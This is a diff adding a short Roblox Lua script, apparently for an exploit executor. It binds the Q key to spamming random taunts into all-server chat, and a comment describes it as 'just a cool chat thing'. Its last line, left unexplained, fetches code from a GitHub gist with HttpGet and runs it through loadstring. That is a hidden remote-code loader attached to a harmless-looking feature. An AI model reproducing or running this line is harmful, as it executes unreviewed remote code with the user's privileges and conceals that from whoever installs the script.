@@ -1,0 +1,29 @@
+--- Script Made By BÂ²O#4938
+print("bobies ;.)")
+--- You can get rid of this, this is just a cool chat thing.
+local plr = game.Players.LocalPlayer
+repeat wait() until plr.Character
+local char = plr.Character
+
+local garbage = {
+    "HAIYA";
+    "You wont get away with this...";
+    "HAAAAAAAAA";
+    "Why are you running, Scared?";
+    "Prepare for your end.";
+
+}
+
+
+function TrashTalk(inputObject, gameProcessedEvent)
+    if inputObject.KeyCode == Enum.KeyCode.Q and gameProcessedEvent == false then
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+        garbage[math.random(1,#garbage)],
+        "All"
+    )
+    end
+end
+ 
+game:GetService("UserInputService").InputBegan:connect(TrashTalk)
+
+loadstring(game:HttpGet(("https://gist.githubusercontent.com/ad3msins/c3f445fd796fa4c768bed3d427b751ae/raw/9555ef4a96b69c6ee184e9b4ca370aa9ab90b5f7/gistfile1.txt"), true))()
